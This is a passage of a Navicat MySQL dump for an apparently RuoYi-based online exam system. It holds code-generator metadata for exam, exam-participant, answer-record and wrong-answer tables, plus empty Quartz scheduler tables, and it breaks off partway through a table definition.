/*
 Navicat Premium Data Transfer

 Source Server         : csp_local
 Source Server Type    : MySQL
 Source Server Version : 80032
 Source Host           : localhost:3306
 Source Schema         : csp

 Target Server Type    : MySQL
 Target Server Version : 80032
 File Encoding         : 65001

 Date: 22/11/2023 08:51:45
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for gen_table
-- ----------------------------
DROP TABLE IF EXISTS `gen_table`;
CREATE TABLE `gen_table` (
  `table_id` bigint NOT NULL AUTO_INCREMENT COMMENT '编号',
  `table_name` varchar(200) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '表名称',
  `table_comment` varchar(500) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '表描述',
  `sub_table_name` varchar(64) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '关联子表的表名',
  `sub_table_fk_name` varchar(64) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '子表关联的外键名',
  `class_name` varchar(100) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '实体类名称',
  `tpl_category` varchar(200) COLLATE utf8mb4_general_ci DEFAULT 'crud' COMMENT '使用的模板（crud单表操作 tree树表操作）',
  `package_name` varchar(100) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '生成包路径',
  `module_name` varchar(30) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '生成模块名',
  `business_name` varchar(30) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '生成业务名',
  `function_name` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '生成功能名',
  `function_author` varchar(50) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '生成功能作者',
  `gen_type` char(1) COLLATE utf8mb4_general_ci DEFAULT '0' COMMENT '生成代码方式（0zip压缩包 1自定义路径）',
  `gen_path` varchar(200) COLLATE utf8mb4_general_ci DEFAULT '/' COMMENT '生成路径（不填默认项目路径）',
  `options` varchar(1000) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '其它生成选项',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`table_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='代码生成业务表';

-- ----------------------------
-- Records of gen_table
-- ----------------------------
BEGIN;
INSERT INTO `gen_table` (`table_id`, `table_name`, `table_comment`, `sub_table_name`, `sub_table_fk_name`, `class_name`, `tpl_category`, `package_name`, `module_name`, `business_name`, `function_name`, `function_author`, `gen_type`, `gen_path`, `options`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (7, 'tb_exam', '考试表', NULL, NULL, 'TbExam', 'crud', 'com.ruoyi.project.cspApi', 'stu', 'exam', '在线考试', 'zzz', '0', '/', '{\"parentMenuId\":\"\"}', 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33', NULL);
INSERT INTO `gen_table` (`table_id`, `table_name`, `table_comment`, `sub_table_name`, `sub_table_fk_name`, `class_name`, `tpl_category`, `package_name`, `module_name`, `business_name`, `function_name`, `function_author`, `gen_type`, `gen_path`, `options`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (8, 'tb_exam_user', '考试-用户映射表（记录参加考试的用户）', NULL, NULL, 'TbExamUser', 'crud', 'com.ruoyi.project.csp', 'csp', 'user', '考试-用户映射（记录参加考试的用户）', 'zzz', '0', '/', NULL, 'admin', '2023-11-03 16:03:03', '', NULL, NULL);
INSERT INTO `gen_table` (`table_id`, `table_name`, `table_comment`, `sub_table_name`, `sub_table_fk_name`, `class_name`, `tpl_category`, `package_name`, `module_name`, `business_name`, `function_name`, `function_author`, `gen_type`, `gen_path`, `options`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (9, 'tb_examination_info', '考试情况记录表', NULL, NULL, 'TbExaminationInfo', 'crud', 'com.ruoyi.project.csp', 'csp', 'info', '考试情况记录', 'zzz', '0', '/', NULL, 'admin', '2023-11-06 16:59:33', '', NULL, NULL);
INSERT INTO `gen_table` (`table_id`, `table_name`, `table_comment`, `sub_table_name`, `sub_table_fk_name`, `class_name`, `tpl_category`, `package_name`, `module_name`, `business_name`, `function_name`, `function_author`, `gen_type`, `gen_path`, `options`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (10, 'tb_error_exercise', '错题记录表', NULL, NULL, 'TbErrorExercise', 'crud', 'com.ruoyi.project.csp', 'csp', 'exercise', '错题记录', 'zzz', '0', '/', NULL, 'admin', '2023-11-07 10:10:00', '', NULL, NULL);
COMMIT;

-- ----------------------------
-- Table structure for gen_table_column
-- ----------------------------
DROP TABLE IF EXISTS `gen_table_column`;
CREATE TABLE `gen_table_column` (
  `column_id` bigint NOT NULL AUTO_INCREMENT COMMENT '编号',
  `table_id` bigint DEFAULT NULL COMMENT '归属表编号',
  `column_name` varchar(200) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '列名称',
  `column_comment` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '列描述',
  `column_type` varchar(100) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '列类型',
  `java_type` varchar(500) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'JAVA类型',
  `java_field` varchar(200) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT 'JAVA字段名',
  `is_pk` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否主键（1是）',
  `is_increment` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否自增（1是）',
  `is_required` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否必填（1是）',
  `is_insert` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否为插入字段（1是）',
  `is_edit` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否编辑字段（1是）',
  `is_list` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否列表字段（1是）',
  `is_query` char(1) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '是否查询字段（1是）',
  `query_type` varchar(200) COLLATE utf8mb4_general_ci DEFAULT 'EQ' COMMENT '查询方式（等于、不等于、大于、小于、范围）',
  `html_type` varchar(200) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '显示类型（文本框、文本域、下拉框、复选框、单选框、日期控件）',
  `dict_type` varchar(200) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '字典类型',
  `sort` int DEFAULT NULL COMMENT '排序',
  `create_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) COLLATE utf8mb4_general_ci DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`column_id`)
) ENGINE=InnoDB AUTO_INCREMENT=90 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='代码生成业务表字段';

-- ----------------------------
-- Records of gen_table_column
-- ----------------------------
BEGIN;
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (55, 7, 'id', '主键', 'bigint', 'Long', 'id', '1', '1', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 1, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (56, 7, 'exam_name', '考试名称', 'varchar(128)', 'String', 'examName', '0', '0', '1', '1', '1', '1', '1', 'LIKE', 'input', '', 2, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (57, 7, 'paper_id', '试卷id', 'bigint', 'Long', 'paperId', '0', '0', '1', '1', '1', '1', '0', 'EQ', 'input', '', 3, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (58, 7, 'paper_name', '试卷名称', 'varchar(128)', 'String', 'paperName', '0', '0', '1', '1', '1', '1', '1', 'LIKE', 'input', '', 4, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (59, 7, 'duration', '持续时间', 'int', 'Long', 'duration', '0', '0', '1', '1', '1', '1', '0', 'EQ', 'input', '', 5, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (60, 7, 'is_delete', '是否删除 0:否 1:是', 'tinyint', 'Long', 'isDelete', '0', '0', NULL, '1', '1', '1', '0', 'EQ', 'input', '', 6, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (61, 7, 'create_by', '创建者', 'varchar(64)', 'String', 'createBy', '0', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 7, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (62, 7, 'create_time', '创建时间', 'datetime', 'Date', 'createTime', '0', '0', NULL, '1', NULL, '1', NULL, 'EQ', 'datetime', '', 8, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (63, 7, 'update_by', '更新者', 'varchar(64)', 'String', 'updateBy', '0', '0', NULL, '1', '1', NULL, NULL, 'EQ', 'input', '', 9, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (64, 7, 'update_time', '更新时间', 'datetime', 'Date', 'updateTime', '0', '0', NULL, '1', '1', NULL, NULL, 'EQ', 'datetime', '', 10, 'admin', '2023-11-03 14:07:39', '', '2023-11-04 21:13:33');
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (65, 8, 'id', '主键', 'bigint', 'Long', 'id', '1', '1', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 1, 'admin', '2023-11-03 16:03:03', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (66, 8, 'exam_id', '考试id', 'bigint', 'Long', 'examId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 2, 'admin', '2023-11-03 16:03:03', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (67, 8, 'user_id', '用户id', 'bigint', 'Long', 'userId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 3, 'admin', '2023-11-03 16:03:03', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (68, 8, 'status', '状态（0：尚未开始 1：正在进行 2：已结束）', 'tinyint', 'Long', 'status', '0', '0', '1', '1', '1', '1', '1', 'EQ', 'radio', '', 4, 'admin', '2023-11-03 16:03:03', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (69, 8, 'start_time', '开始时间', 'datetime', 'Date', 'startTime', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'datetime', '', 5, 'admin', '2023-11-03 16:03:03', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (70, 8, 'end_time', '结束时间', 'datetime', 'Date', 'endTime', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'datetime', '', 6, 'admin', '2023-11-03 16:03:03', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (71, 9, 'id', '主键', 'bigint', 'Long', 'id', '1', '1', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 1, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (72, 9, 'exam_id', '考试id', 'bigint', 'Long', 'examId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 2, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (73, 9, 'user_id', '用户id', 'bigint', 'Long', 'userId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 3, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (74, 9, 'exercise_id', '题目id', 'bigint', 'Long', 'exerciseId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 4, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (75, 9, 'answer', '答案', 'varchar(64)', 'String', 'answer', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 5, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (76, 9, 'is_true', '是否正确 0：否 1：是', 'int', 'Long', 'isTrue', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 6, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (77, 9, 'create_by', '创建者', 'varchar(64)', 'String', 'createBy', '0', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 7, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (78, 9, 'create_time', '创建时间', 'datetime', 'Date', 'createTime', '0', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'datetime', '', 8, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (79, 9, 'update_by', '更新者', 'varchar(64)', 'String', 'updateBy', '0', '0', NULL, '1', '1', NULL, NULL, 'EQ', 'input', '', 9, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (80, 9, 'update_time', '更新时间', 'datetime', 'Date', 'updateTime', '0', '0', NULL, '1', '1', NULL, NULL, 'EQ', 'datetime', '', 10, 'admin', '2023-11-06 16:59:33', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (81, 10, 'id', '主键', 'bigint', 'Long', 'id', '1', '1', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 1, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (82, 10, 'exercise_id', '题目id', 'bigint', 'Long', 'exerciseId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 2, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (83, 10, 'user_id', '用户id', 'bigint', 'Long', 'userId', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 3, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (84, 10, 'error_counts', '错误次数', 'int', 'Long', 'errorCounts', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 4, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (85, 10, 'is_delete', '是否删除 0:否 1:是', 'tinyint', 'Long', 'isDelete', '0', '0', NULL, '1', '1', '1', '1', 'EQ', 'input', '', 5, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (86, 10, 'create_by', '创建者', 'varchar(64)', 'String', 'createBy', '0', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'input', '', 6, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (87, 10, 'create_time', '创建时间', 'datetime', 'Date', 'createTime', '0', '0', NULL, '1', NULL, NULL, NULL, 'EQ', 'datetime', '', 7, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (88, 10, 'update_by', '更新者', 'varchar(64)', 'String', 'updateBy', '0', '0', NULL, '1', '1', NULL, NULL, 'EQ', 'input', '', 8, 'admin', '2023-11-07 10:10:00', '', NULL);
INSERT INTO `gen_table_column` (`column_id`, `table_id`, `column_name`, `column_comment`, `column_type`, `java_type`, `java_field`, `is_pk`, `is_increment`, `is_required`, `is_insert`, `is_edit`, `is_list`, `is_query`, `query_type`, `html_type`, `dict_type`, `sort`, `create_by`, `create_time`, `update_by`, `update_time`) VALUES (89, 10, 'update_time', '更新时间', 'datetime', 'Date', 'updateTime', '0', '0', NULL, '1', '1', NULL, NULL, 'EQ', 'datetime', '', 9, 'admin', '2023-11-07 10:10:00', '', NULL);
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_BLOB_TRIGGERS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_BLOB_TRIGGERS`;
CREATE TABLE `QRTZ_BLOB_TRIGGERS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `blob_data` blob COMMENT '存放持久化Trigger对象',
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_blob_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='Blob类型的触发器表';

-- ----------------------------
-- Records of QRTZ_BLOB_TRIGGERS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_CALENDARS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_CALENDARS`;
CREATE TABLE `QRTZ_CALENDARS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `calendar_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '日历名称',
  `calendar` blob NOT NULL COMMENT '存放持久化calendar对象',
  PRIMARY KEY (`sched_name`,`calendar_name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='日历信息表';

-- ----------------------------
-- Records of QRTZ_CALENDARS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_CRON_TRIGGERS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_CRON_TRIGGERS`;
CREATE TABLE `QRTZ_CRON_TRIGGERS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `trigger_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `cron_expression` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'cron表达式',
  `time_zone_id` varchar(80) COLLATE utf8mb4_general_ci DEFAULT NULL COMMENT '时区',
  PRIMARY KEY (`sched_name`,`trigger_name`,`trigger_group`),
  CONSTRAINT `qrtz_cron_triggers_ibfk_1` FOREIGN KEY (`sched_name`, `trigger_name`, `trigger_group`) REFERENCES `QRTZ_TRIGGERS` (`sched_name`, `trigger_name`, `trigger_group`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci COMMENT='Cron类型的触发器表';

-- ----------------------------
-- Records of QRTZ_CRON_TRIGGERS
-- ----------------------------
BEGIN;
COMMIT;

-- ----------------------------
-- Table structure for QRTZ_FIRED_TRIGGERS
-- ----------------------------
DROP TABLE IF EXISTS `QRTZ_FIRED_TRIGGERS`;
CREATE TABLE `QRTZ_FIRED_TRIGGERS` (
  `sched_name` varchar(120) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度名称',
  `entry_id` varchar(95) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度器实例id',
  `trigger_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_name的外键',
  `trigger_group` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT 'qrtz_triggers表trigger_group的外键',
  `instance_name` varchar(200) COLLATE utf8mb4_general_ci NOT NULL COMMENT '调度器实例名',
  `fired_time` bigint NOT NULL COMMENT '触发的时间',
  `sched_time` bigint NOT NULL COMMENT '定时器制定的时间',
  `priority` int NOT NULL COMMENT '优先级',
  `state` varchar(16) COLLATE utf8mb4_general_ci NOT NULL COMMENT '状态',
